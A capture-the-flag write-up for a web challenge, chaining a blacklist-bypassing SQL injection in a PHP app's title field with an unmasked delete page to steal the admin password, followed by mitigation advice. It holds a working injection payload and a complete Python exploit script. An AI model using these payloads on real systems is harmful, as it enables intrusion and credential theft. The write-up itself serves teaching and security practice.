# Utopia, The Corrupted City - Complete Writeup

## Challenge Information

**Name:** Utopia, The Corrupted City  
**Category:** Web Security  
**Difficulty:** Hard  
**Points:** 500  
**Solves:** 0  
**Flag:** `flag{5b9c7fe26dbce502}`

## Challenge Description

> Shall you behold my revenge :)

A property management web application for Utopia Smart City with authentication and CRUD operations for properties.

## Initial Reconnaissance

### Instance Access
- **URL:** https://60eb4294769d1d72.chal.ctf.ae
- **Login Credentials:** guest/guest (provided in challenge)

### Application Features
1. User authentication system
2. Property listing with masked data for non-admin users
3. Add/Edit/Delete property functionality
4. Admin-only full access to property details
5. Flag displayed on dashboard for admin users only

## Source Code Analysis

### File Structure
```
src/
├── add-property.php       # Property creation endpoint
├── dashboard.php          # Main dashboard with flag
├── delete-property.php    # Property deletion (CRITICAL!)
├── edit-property.php      # Property editing
├── login.php             # Authentication
└── includes/
    ├── auth.php          # Session management
    ├── config.php        # Input validation
    ├── functions.php     # Database operations (VULNERABLE!)
    └── db.php           # Database connection
```

## Vulnerability Discovery

### 1. SQL Injection in `add_property()` Function

**Location:** `/src/includes/functions.php` (Lines 71-85)

```php
function add_property($data) {
    global $conn;
    
    $title = $data['title'];  // ❌ NOT SANITIZED!
    $description = $conn->real_escape_string($data['description']);
    $address = $conn->real_escape_string($data['address']);
    $price = floatval($data['price']);
    $property_type = $conn->real_escape_string($data['property_type']);
    $bedrooms = intval($data['bedrooms']);
    $bathrooms = intval($data['bathrooms']);
    $area_sqft = intval($data['area_sqft']);
    $amenities = $conn->real_escape_string($data['amenities']);
    $contact_info = $conn->real_escape_string($data['contact_info']);
    
    $sql = "INSERT INTO properties (description, address, price, property_type, bedrooms, bathrooms, area_sqft, amenities, contact_info,title) 
            VALUES ('$description', '$address', $price, '$property_type', $bedrooms, $bathrooms, $area_sqft, '$amenities', '$contact_info','$title')";

    return $conn->query($sql);
}
```

**Critical Finding:** The `$title` parameter is directly interpolated into the SQL query without any sanitization!

### 2. Incomplete Input Validation

**Location:** `/src/add-property.php` (Lines 17-18)

```php
if (isset($_POST['title']) && 
    isset($_POST['description']) && 
    is_input_safe($_POST['title']) && 
    is_input_safe($_POST['description']))
```

Only `title` and `description` are validated, but the validation can be bypassed.

### 3. Weak Input Filter

**Location:** `/src/includes/config.php`

```php
define('SQL_BAN_LIST', [
    '_', ';', ':', '!', '?', '.', '"', '[', '@', '*', '/', '\\', '&', '%', '`', '^', '+', '<', '>', '|', '~', '$', '#',
    'alter', 'benchmark', 'count', 'create', 'cursor', 'database', 'declare', 'delay', 'delete', 
    'describe', 'drop', 'exec', 'extract', 'fetch', 'insert', 'right', 'rlike', 'rpad', 'set', 
    'sha2', 'sleep', 'table', 'union', 'update', 'wait'
]);
```

**What's NOT Banned (Critical!):**
- ✅ `select` keyword
- ✅ `from` keyword
- ✅ `where` keyword
- ✅ Parentheses `()`
- ✅ Single quotes `'`
- ✅ Commas `,`
- ✅ Dashes `-` (for SQL comments)

This allows us to craft subquery-based SQL injection!

### 4. Unmasked Data Endpoint (Data Exfiltration Point)

**Location:** `/src/delete-property.php` (Lines 73-74)

```php
<h3><?= htmlspecialchars($property['title']) ?></h3>
<p><strong>Address:</strong> <?= htmlspecialchars($property['address']) ?></p>
```

**Critical Discovery:** No admin check! Property titles and addresses are displayed without masking for ALL users!

Compare with other endpoints:
- `dashboard.php`: `$is_admin ? htmlspecialchars($property['title']) : str_repeat('*', ...)`
- `property.php`: Same masking logic
- `edit-property.php`: Masked for non-admin

**This is our data exfiltration vector!**

## Exploitation Strategy

### Attack Chain

```
1. Login as guest
   ↓
2. Inject SQL payload in title field
   ↓
3. Create property with admin password as title
   ↓
4. Access delete-property.php (unmasked!)
   ↓
5. Extract admin password
   ↓
6. Login as admin
   ↓
7. Access dashboard → Get FLAG
```

### SQL Injection Payload Construction

**Target SQL Query:**
```sql
INSERT INTO properties (description, address, price, property_type, bedrooms, bathrooms, area_sqft, amenities, contact_info, title) 
VALUES ('$description', '$address', $price, '$property_type', $bedrooms, $bathrooms, $area_sqft, '$amenities', '$contact_info', '$title')
```

**Our Payload:**
```sql
test'), ('desc', 'addr', 1000, 'apartment', 1, 1, 500, 'amenities', 'contact', (select pwd from users where username='admin'))-- -
```

**Resulting Query:**
```sql
INSERT INTO properties (..., title) 
VALUES ('test', 'test', 1000, 'apartment', 1, 1, 500, 'test', 'test', 'test'), 
       ('desc', 'addr', 1000, 'apartment', 1, 1, 500, 'amenities', 'contact', (select pwd from users where username='admin'))-- -', ...)
```

This creates TWO properties:
1. First property with title "test" (decoy)
2. Second property with title = admin's password (extracted via subquery)

## Exploitation Steps

### Step 1: Login as Guest

```bash
curl -X POST https://60eb4294769d1d72.chal.ctf.ae/login.php \
  -d "username=guest&pwd=guest" \
  -c cookies.txt
```

### Step 2: Submit SQL Injection Payload

```python
import requests

session = requests.Session()
session.post("https://60eb4294769d1d72.chal.ctf.ae/login.php",
            data={"username": "guest", "pwd": "guest"})

payload = "test'), ('desc', 'addr', 1000, 'apartment', 1, 1, 500, 'amenities', 'contact', (select pwd from users where username='admin'))-- -"

data = {
    "title": payload,
    "description": "test",
    "address": "test",
    "price": "1000",
    "property_type": "apartment",
    "bedrooms": "1",
    "bathrooms": "1",
    "area_sqft": "500",
    "amenities": "test",
    "contact_info": "test"
}

session.post("https://60eb4294769d1d72.chal.ctf.ae/add-property.php", data=data)
```

### Step 3: Extract Admin Password

```python
import re

# Get property IDs
dash = session.get("https://60eb4294769d1d72.chal.ctf.ae/dashboard.php")
ids = re.findall(r'property\.php\?id=(\d+)', dash.text)

# Check newest properties via delete-property.php
for prop_id in sorted([int(i) for i in ids], reverse=True)[:10]:
    del_resp = session.post("https://60eb4294769d1d72.chal.ctf.ae/delete-property.php",
                           data={"property_id": str(prop_id)})
    
    title_match = re.search(r'<h3>(.*?)</h3>', del_resp.text)
    if title_match:
        title = title_match.group(1).strip()
        
        # Admin password is 64-char hex string
        if len(title) == 64 and all(c in '0123456789abcdef' for c in title.lower()):
            admin_password = title
            print(f"[+] Admin password: {admin_password}")
            break
```

**Extracted Password:** `a0e8b034c1536b8a378c5669a3d7b90bd5a612f84422b5e9fe17dd3b67d2a402`

### Step 4: Login as Admin

```python
admin_session = requests.Session()
admin_session.post("https://60eb4294769d1d72.chal.ctf.ae/login.php",
                  data={"username": "admin", "pwd": admin_password})
```

### Step 5: Retrieve Flag

```python
admin_dash = admin_session.get("https://60eb4294769d1d72.chal.ctf.ae/dashboard.php")

flag_match = re.search(r'flag\{[^}]+\}', admin_dash.text)
if flag_match:
    flag = flag_match.group(0)
    print(f"FLAG: {flag}")
```

**Flag Location in Dashboard:**
```php
<?php if (!empty($is_admin) && $is_admin === true): ?>
    <div class="flag">
        You have full access to all property details.
        <b id='flag'>
        <?php echo getenv('FLAG'); ?>
        </b>
    </div>
<?php endif; ?>
```

## Complete Exploit Script

```python
#!/usr/bin/env python3
import requests
import re

BASE_URL = "https://60eb4294769d1d72.chal.ctf.ae"

print("="*70)
print("Utopia, The Corrupted City - SQL Injection Exploit")
print("="*70)

# Step 1: Login as guest
print("\n[*] Step 1: Logging in as guest...")
session = requests.Session()
login_resp = session.post(f"{BASE_URL}/login.php", 
                         data={"username": "guest", "pwd": "guest"})
print("[+] Logged in as guest")

# Step 2: SQL Injection
print("\n[*] Step 2: Injecting SQL payload...")
payload = "test'), ('desc', 'addr', 1000, 'apartment', 1, 1, 500, 'amenities', 'contact', (select pwd from users where username='admin'))-- -"

data = {
    "title": payload,
    "description": "test",
    "address": "test",
    "price": "1000",
    "property_type": "apartment",
    "bedrooms": "1",
    "bathrooms": "1",
    "area_sqft": "500",
    "amenities": "test",
    "contact_info": "test"
}

session.post(f"{BASE_URL}/add-property.php", data=data)
print("[+] Payload submitted")

# Step 3: Extract password
print("\n[*] Step 3: Extracting admin password...")
dash = session.get(f"{BASE_URL}/dashboard.php")
ids = re.findall(r'property\.php\?id=(\d+)', dash.text)

known_titles = ['Skyline Tower Apartment', 'Green Valley House', 'Tech Hub Studio', 
                'Luxury Penthouse', 'Smart Family Home', 'Urban Loft', 'test']

admin_password = None
for prop_id in sorted([int(i) for i in ids], reverse=True)[:15]:
    del_resp = session.post(f"{BASE_URL}/delete-property.php", 
                           data={"property_id": str(prop_id)})
    
    title_match = re.search(r'<h3>(.*?)</h3>', del_resp.text)
    if title_match:
        title = title_match.group(1).strip()
        if title not in known_titles and len(title) >= 16:
            admin_password = title
            print(f"[+] Found admin password: {admin_password}")
            break

# Step 4: Login as admin
print("\n[*] Step 4: Logging in as admin...")
admin_session = requests.Session()
admin_session.post(f"{BASE_URL}/login.php", 
                  data={"username": "admin", "pwd": admin_password})
print("[+] Logged in as admin")

# Step 5: Get flag
print("\n[*] Step 5: Retrieving flag...")
admin_dash = admin_session.get(f"{BASE_URL}/dashboard.php")

flag_match = re.search(r'flag\{[^}]+\}', admin_dash.text)
if flag_match:
    flag = flag_match.group(0)
    print("\n" + "="*70)
    print(f"SUCCESS! FLAG: {flag}")
    print("="*70)
    
    with open("flag.txt", "w") as f:
        f.write(flag)
```

## Flag

```
flag{5b9c7fe26dbce502}
```

## Key Takeaways

### Vulnerabilities Identified

1. **Inconsistent Input Sanitization**
   - Only some parameters were sanitized
   - The `title` parameter was completely missed
   - **Lesson:** ALL user inputs must be sanitized consistently

2. **Weak Blacklist Filtering**
   - Blacklist-based filtering is inherently weak
   - Missed critical keywords like `select` and `from`
   - **Lesson:** Use parameterized queries instead of filters

3. **Inadequate Access Control**
   - `delete-property.php` displayed sensitive data without admin check
   - **Lesson:** Implement consistent access controls across all endpoints

4. **Information Disclosure**
   - Unmasked endpoint revealed injected data
   - **Lesson:** Consistent data masking for non-privileged users

### Proper Mitigation

**Use Prepared Statements:**
```php
$stmt = $conn->prepare("INSERT INTO properties (..., title) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
$stmt->bind_param("ssdsiiiiss", $description, $address, $price, $property_type, 
                  $bedrooms, $bathrooms, $area_sqft, $amenities, $contact_info, $title);
$stmt->execute();
```

**Implement Consistent Access Controls:**
```php
// In delete-property.php
if (!SessionManager::isAdmin()) {
    $property['title'] = str_repeat('*', strlen($property['title']));
    $property['address'] = str_repeat('*', strlen($property['address']));
}
```

**Use Whitelist Validation:**
```php
// Instead of blacklist, use whitelist
function validate_title($title) {
    // Only allow alphanumeric and basic punctuation
    if (!preg_match('/^[a-zA-Z0-9\s\-,\.]+$/', $title)) {
        throw new Exception("Invalid title format");
    }
    return $title;
}
```

## Timeline

1. **Initial Analysis** (15 min) - Identified SQL injection in add-property.php
2. **Filter Analysis** (10 min) - Discovered `select`/`from` not banned
3. **Endpoint Discovery** (20 min) - Found delete-property.php doesn't mask data
4. **Exploitation** (15 min) - Extracted admin password via SQL injection
5. **Flag Retrieval** (5 min) - Logged in as admin and retrieved flag

**Total Time:** ~65 minutes

## Tools Used

- **Python requests** - HTTP client for automation
- **curl** - Command-line testing
- **Browser DevTools** - For analyzing application behavior
- **Regular expressions** - For extracting data from responses

## Difficulty Rating

⭐⭐⭐⭐☆ (4/5) - Hard

**Reasons:**
- Multiple vulnerabilities need to be chained
- Requires understanding of SQL injection with subqueries
- Need to identify the unmasked endpoint
- Blacklist bypass required
- Multi-step exploitation process

## Author Notes

This challenge demonstrates the importance of:
- Consistent input validation across all parameters
- Using parameterized queries instead of string concatenation
- Implementing proper access controls on all endpoints
- Defense in depth - multiple security layers

**Challenge Rating:** Excellent real-world scenario showcasing common web vulnerabilities

---

**Solved by:** [Your Name]  
**Date:** October 25, 2025  
**Challenge:** Utopia, The Corrupted City  
**Flag:** `flag{5b9c7fe26dbce502}`
